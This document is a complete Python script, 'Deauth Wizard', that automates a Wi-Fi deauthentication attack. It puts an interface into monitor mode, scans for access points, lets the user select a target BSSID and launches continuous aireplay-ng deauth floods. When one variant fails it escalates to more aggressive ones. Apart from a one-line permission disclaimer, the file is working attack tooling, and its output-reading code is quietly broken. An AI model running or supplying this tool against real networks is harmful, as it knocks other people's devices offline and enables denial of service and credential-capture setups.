#!/usr/bin/env python3

import os
import sys
import time
import signal
import subprocess
import logging
from typing import Dict, List, Optional

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""

# Global attack process variable
ATTACK_PROCESS: Optional[subprocess.Popen] = None
ATTACK_RUNNING = False


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def print_header(title: str, subtitle: Optional[str] = None) -> None:
    logging.info(color_text(title, COLOR_HEADER))
    if subtitle:
        logging.info(subtitle)
    logging.info("")


def prompt_int(prompt: str, default: int, minimum: int = 1) -> int:
    raw = input(prompt).strip()
    if not raw:
        return default
    try:
        value = int(raw)
    except ValueError:
        return default
    if value < minimum:
        return minimum
    return value


def list_network_interfaces() -> List[str]:
    interfaces: List[str] = []
    ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def get_interface_chipset(interface: str) -> str:
    try:
        result = subprocess.run(
            ["ethtool", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def select_interface(interfaces: List[str]) -> str:
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info("")
    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        label = f"{index}) {name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style('Select interface', STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def get_interface_mode(interface: str) -> Optional[str]:
    result = subprocess.run(
        ["iw", "dev", interface, "info"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return None
    for raw_line in result.stdout.splitlines():
        line = raw_line.strip()
        if line.startswith("type "):
            parts = line.split()
            if len(parts) >= 2:
                return parts[1]
    return None


def is_monitor_mode(interface: str) -> bool:
    return get_interface_mode(interface) == "monitor"


def set_interface_type(interface: str, mode: str) -> bool:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        result = subprocess.run(
            ["iw", "dev", interface, "set", "type", mode],
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
        if result.returncode != 0:
            logging.error("Failed to set %s mode: %s", mode, result.stderr.strip() or "unknown error")
            return False
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        return True
    except Exception as exc:
        logging.error("Failed to set %s mode: %s", mode, exc)
        return False


def restore_managed_mode(interface: str) -> None:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def freq_to_channel(freq: float) -> Optional[int]:
    if 2412 <= freq <= 2472:
        return int((freq - 2407) // 5)
    if freq == 2484:
        return 14
    if 5000 <= freq <= 5825:
        return int((freq - 5000) // 5)
    return None


def parse_channel_value(text: str) -> Optional[int]:
    try:
        return int(text)
    except (TypeError, ValueError):
        return None


def parse_freq_value(text: str) -> Optional[float]:
    try:
        value = float(text)
    except (TypeError, ValueError):
        return None
    if value > 100000:
        value /= 1000.0
    return value


def scan_wireless_networks(
    interface: str,
    duration_seconds: int = 15,
    show_progress: bool = False,
) -> List[Dict[str, Optional[str]]]:
    def run_scan() -> subprocess.CompletedProcess:
        return subprocess.run(
            ["iw", "dev", interface, "scan"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )

    end_time = time.time() + max(1, duration_seconds)
    networks: Dict[str, Dict[str, Optional[str]]] = {}
    last_remaining = None
    while time.time() < end_time:
        if show_progress and COLOR_ENABLED:
            remaining = max(0, int(end_time - time.time()))
            if remaining != last_remaining:
                last_remaining = remaining
                message = (
                    f"{style('Scanning', STYLE_BOLD)}... "
                    f"{style(str(remaining), COLOR_SUCCESS, STYLE_BOLD)}s remaining"
                )
                sys.stdout.write("\r" + message)
                sys.stdout.flush()
        try:
            result = run_scan()
        except FileNotFoundError:
            logging.error("Required tool 'iw' not found!")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []

        if result.returncode != 0 and is_monitor_mode(interface):
            if set_interface_type(interface, "managed"):
                result = run_scan()
                if not set_interface_type(interface, "monitor"):
                    logging.error("Failed to restore monitor mode after scan.")

        if result.returncode != 0:
            logging.error("Wireless scan failed: %s", result.stderr.strip() or "unknown error")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []

        current: Dict[str, Optional[str]] = {}
        for raw_line in result.stdout.splitlines():
            line = raw_line.strip()
            if line.startswith("BSS "):
                if current.get("bssid") and current.get("ssid"):
                    existing = networks.get(current["bssid"])
                    if existing is None or (
                        current.get("signal") is not None
                        and (existing.get("signal") is None or current["signal"] > existing["signal"])
                    ):
                        networks[current["bssid"]] = current
                current = {"bssid": line.split()[1].split("(")[0], "ssid": None, "signal": None, "channel": None}
                continue
            if line.startswith("freq:"):
                parts = line.split()
                freq_val = parse_freq_value(parts[1]) if len(parts) > 1 else None
                current["channel"] = freq_to_channel(freq_val) if freq_val is not None else None
                continue
            if line.startswith("DS Parameter set:"):
                parts = line.split()
                if len(parts) >= 4 and parts[-2] == "channel":
                    channel_val = parse_channel_value(parts[-1])
                    if channel_val is not None:
                        current["channel"] = channel_val
                continue
            if line.startswith("* primary channel:"):
                parts = line.split(":")
                if len(parts) == 2:
                    channel_val = parse_channel_value(parts[1].strip())
                    if channel_val is not None:
                        current["channel"] = channel_val
                continue
            if line.startswith("signal:"):
                parts = line.split()
                try:
                    current["signal"] = float(parts[1])
                except (IndexError, ValueError):
                    current["signal"] = None
                continue
            if line.startswith("SSID:"):
                ssid_val = line.split(":", 1)[1].strip()
                current["ssid"] = ssid_val if ssid_val else "<hidden>"

        if current.get("bssid") and current.get("ssid"):
            existing = networks.get(current["bssid"])
            if existing is None or (
                current.get("signal") is not None
                and (existing.get("signal") is None or current["signal"] > existing["signal"])
            ):
                networks[current["bssid"]] = current

        time.sleep(0.2)

    if show_progress and COLOR_ENABLED:
        sys.stdout.write("\n")

    sorted_networks = sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )
    return sorted_networks


def select_network(attack_interface: str, duration_seconds: int) -> Dict[str, Optional[str]]:
    while True:
        networks = scan_wireless_networks(attack_interface, duration_seconds, show_progress=True)
        if not networks:
            logging.warning("No networks found during scan.")
            retry = input(f"{style('Rescan', STYLE_BOLD)}? (Y/N): ").strip().lower()
            if retry == "y":
                continue
            sys.exit(1)

        logging.info("")
        logging.info(style("Available networks:", STYLE_BOLD))
        for index, net in enumerate(networks, start=1):
            signal = f"{net['signal']:.1f} dBm" if net["signal"] is not None else "signal unknown"
            channel = f"ch {net['channel']}" if net["channel"] else "ch ?"
            label = f"{index}) {net['ssid']} ({net['bssid']}) -"
            logging.info("  %s %s %s", color_text(label, COLOR_HIGHLIGHT), channel, signal)

        choice = input(
            f"{style('Select network', STYLE_BOLD)} (number, or R to rescan): "
        ).strip().lower()
        if choice == "r":
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(networks):
                return networks[idx - 1]
        logging.warning("Invalid selection. Try again.")


SELECTED_INTERFACE: Optional[str] = None


def cleanup() -> None:
    if SELECTED_INTERFACE:
        restore_managed_mode(SELECTED_INTERFACE)
    stop_attack()


def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> bool:
    global ATTACK_PROCESS, ATTACK_RUNNING
    bssid = target["bssid"]
    channel = target["channel"]
    
    if not bssid:
        logging.error("Missing target BSSID; cannot start attack.")
        return False

    # Testowanie interfejsu
    logging.info("Testing interface %s...", interface)
    test_result = subprocess.run(
        ["aireplay-ng", "--test", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    
    if test_result.returncode == 0:
        logging.info(color_text("✓ Interface test passed", COLOR_SUCCESS))
        if "Injection is working!" in test_result.stdout:
            logging.info(color_text("✓ Packet injection working", COLOR_SUCCESS))
    else:
        logging.warning("Interface test issues: %s", test_result.stderr[:100])
    
    # Ustaw kanał jeśli znany
    if channel:
        logging.info("Setting channel %s on %s...", channel, interface)
        channel_result = subprocess.run(
            ["iw", "dev", interface, "set", "channel", str(channel)],
            stderr=subprocess.PIPE,
            text=True,
        )
        if channel_result.returncode != 0:
            logging.warning("Could not set channel: %s", channel_result.stderr.strip())
    
    # SPRAWDŹ CZY WIDZISZ CELEWY BSSID
    logging.info("\nChecking for target BSSID %s...", bssid)
    scan_result = subprocess.run(
        ["iw", "dev", interface, "scan"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    
    target_found = False
    if scan_result.returncode == 0:
        for line in scan_result.stdout.splitlines():
            if bssid.lower() in line.lower():
                target_found = True
                break
    
    if not target_found:
        logging.warning("⚠ Target BSSID not found in scan!")
        logging.warning("Make sure you're on the correct channel and in range.")
        proceed = input("Continue anyway? (y/n): ").strip().lower()
        if proceed != 'y':
            return False
    
    # URUCHOM ATAK Z WIĘKSZĄ LICZBĄ PAKIETÓW
    logging.info("\nStarting aggressive deauth attack on %s...", bssid)
    
    # Próbuj różne opcje aireplay-ng:
    options_to_try = [
        # Standard
        ["aireplay-ng", "-0", "0", "-a", bssid, interface],
        # Z większą szybkością
        ["aireplay-ng", "-0", "1000", "-a", bssid, interface],
        # Z określonym interwałem
        ["aireplay-ng", "-0", "0", "-a", bssid, "-x", "100", interface],
    ]
    
    for i, cmd in enumerate(options_to_try):
        if i == 0:
            # Pierwsza próba - standardowa
            logging.info("Trying standard attack...")
        else:
            logging.info("Trying alternative method %d...", i)
            stop_attack()
            time.sleep(1)
        
        try:
            ATTACK_PROCESS = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid,
            )
            
            # Czytaj output przez 5 sekund żeby zobaczyć co się dzieje
            for _ in range(5):
                if ATTACK_PROCESS.poll() is not None:
                    break
                    
                # Sprawdź czy są jakieś komunikaty
                try:
                    # Użyj read1() zamiast read() dla PIPE
                    if ATTACK_PROCESS.stdout:
                        output = ATTACK_PROCESS.stdout.read1(1024).decode('utf-8', errors='ignore')
                        if output:
                            logging.info("aireplay-ng: %s", output.strip())
                            
                    if ATTACK_PROCESS.stderr:
                        error = ATTACK_PROCESS.stderr.read1(1024).decode('utf-8', errors='ignore')
                        if error:
                            logging.warning("aireplay-ng error: %s", error.strip())
                except:
                    pass
                    
                time.sleep(1)
            
            # Jeśli proces nadal działa, kontynuuj
            if ATTACK_PROCESS.poll() is None:
                logging.info(color_text("✓ Attack running (method %d)", COLOR_SUCCESS), i+1)
                ATTACK_RUNNING = True
                
                # Pobierz PID i wyświetl informację
                try:
                    pid = ATTACK_PROCESS.pid
                    logging.info("Attack PID: %d", pid)
                except:
                    pass
                    
                return True
            else:
                exit_code = ATTACK_PROCESS.poll()
                logging.warning("Attack stopped with code %d, trying next method...", exit_code)
                
        except Exception as exc:
            logging.error("Error with method %d: %s", i+1, exc)
    
    logging.error("All attack methods failed!")
    return False


def stop_attack() -> None:
    global ATTACK_PROCESS, ATTACK_RUNNING
    if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
        logging.info("Stopping deauth attack...")
        try:
            try:
                pgid = os.getpgid(ATTACK_PROCESS.pid)
            except Exception:
                pgid = None
            
            if pgid is not None:
                try:
                    os.killpg(pgid, signal.SIGTERM)
                except Exception:
                    ATTACK_PROCESS.terminate()
            else:
                ATTACK_PROCESS.terminate()
            
            try:
                ATTACK_PROCESS.wait(timeout=5)
            except subprocess.TimeoutExpired:
                try:
                    if pgid is not None:
                        os.killpg(pgid, signal.SIGKILL)
                    else:
                        ATTACK_PROCESS.kill()
                    ATTACK_PROCESS.wait(timeout=2)
                except Exception:
                    pass
        except Exception as e:
            logging.warning("Error while stopping attack: %s", e)
        
        try:
            for _ in range(10):
                if ATTACK_PROCESS.poll() is not None:
                    break
                time.sleep(0.5)
        except Exception:
            pass
    
    ATTACK_PROCESS = None
    ATTACK_RUNNING = False


def monitor_attack() -> None:
    """Monitoruje proces ataku i informuje jeśli się zakończył nieoczekiwanie"""
    global ATTACK_RUNNING
    
    check_count = 0
    while ATTACK_RUNNING:
        time.sleep(2)
        check_count += 1
        
        if ATTACK_PROCESS is None:
            break
            
        if ATTACK_PROCESS.poll() is not None:
            logging.error("\n%s Attack process terminated unexpectedly!", color_text("✗", COLOR_WARNING))
            if ATTACK_PROCESS.stderr:
                try:
                    stderr_content = ATTACK_PROCESS.stderr.read().strip()
                    if stderr_content:
                        logging.error("Error output: %s", stderr_content)
                except:
                    pass
            ATTACK_RUNNING = False
            break
        
        # Co 30 sekund wyświetl informację że atak nadal trwa
        if check_count % 15 == 0 and ATTACK_RUNNING:
            logging.info("%s Attack still running...", color_text("→", COLOR_HIGHLIGHT))


def run_deauth_session() -> bool:
    global SELECTED_INTERFACE, ATTACK_RUNNING

    interfaces = list_network_interfaces()
    SELECTED_INTERFACE = select_interface(interfaces)

    logging.info("")
    input(f"{style('Press Enter', STYLE_BOLD)} to switch {SELECTED_INTERFACE} to monitor mode...")
    if not set_interface_type(SELECTED_INTERFACE, "monitor"):
        return False
    logging.info("Monitor mode confirmed on %s.", SELECTED_INTERFACE)

    logging.info("")
    scan_seconds = prompt_int(
        f"{style('Scan duration', STYLE_BOLD)} in seconds "
        f"({style('Enter', STYLE_BOLD)} for {style('15', COLOR_SUCCESS, STYLE_BOLD)}): ",
        default=15,
    )

    logging.info("")
    input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {SELECTED_INTERFACE}...")
    target_network = select_network(SELECTED_INTERFACE, scan_seconds)
    logging.info("")
    logging.info(
        "Target selected: %s (%s)",
        style(target_network["ssid"], COLOR_SUCCESS, STYLE_BOLD),
        target_network["bssid"],
    )

    if not is_monitor_mode(SELECTED_INTERFACE):
        logging.warning("Interface left monitor mode; re-enabling.")
        if not set_interface_type(SELECTED_INTERFACE, "monitor"):
            return False

    logging.info("")
    logging.info(style("Starting deauthentication attack...", COLOR_WARNING, STYLE_BOLD))
    
    if not start_deauth_attack(SELECTED_INTERFACE, target_network):
        logging.error("Failed to start deauth attack.")
        return False
    
    logging.info("")
    logging.info("Deauth attack is now running continuously.")
    logging.info("The attack will continue until you manually stop it.")
    logging.info("")
    logging.info(style("Options:", STYLE_BOLD))
    logging.info("  [S] - Stop attack and return to interface selection")
    logging.info("  [B] - Stop attack and return to main menu")
    logging.info("  [R] - Stop attack and restart from scanning")
    logging.info("  [Ctrl+C] - Emergency stop")
    logging.info("")
    
    # Uruchom wątek monitorujący atak w tle
    import threading
    monitor_thread = threading.Thread(target=monitor_attack, daemon=True)
    monitor_thread.start()
    
    try:
        while ATTACK_RUNNING:
            try:
                choice = input(
                    f"{style('Enter option', STYLE_BOLD)} (S/B/R): "
                ).strip().lower()
                
                if choice in {"s", "stop"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
                    logging.info("Returning to interface selection...")
                    logging.info("")
                    return True  # Restart
                elif choice in {"b", "back"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
                    return False  # Back to main menu
                elif choice in {"r", "restart"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
                    logging.info("Restarting from network scan...")
                    logging.info("")
                    return True  # Restart
                else:
                    logging.warning("Please enter S, B, or R.")
            except KeyboardInterrupt:
                logging.info("\n")
                confirm = input(f"{style('Really stop attack?', STYLE_BOLD)} (Y/N): ").strip().lower()
                if confirm in {"y", "yes"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped by user", COLOR_SUCCESS))
                    logging.info("")
                    break
                else:
                    logging.info("Continuing attack...")
                    continue
    except Exception as e:
        logging.error("Unexpected error: %s", e)
        stop_attack()
    
    return False


def main() -> None:
    print_header("Deauth Wizard", "Wi-Fi Deauthentication Attack Tool")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    required_tools = ["iw", "ip", "ethtool", "aireplay-ng"]
    for tool in required_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            logging.error("Required tool '%s' not found!", tool)
            sys.exit(1)

    import atexit
    atexit.register(cleanup)

    while True:
        logging.info(style("Disclaimer:", STYLE_BOLD))
        logging.info(
            "Only test on networks and devices you own or have explicit permission to use."
        )
        logging.info("")
        restart = run_deauth_session()
        if not restart:
            break
        logging.info(color_text("Restarting deauth wizard...\n", COLOR_HEADER))


if __name__ == "__main__":
    main()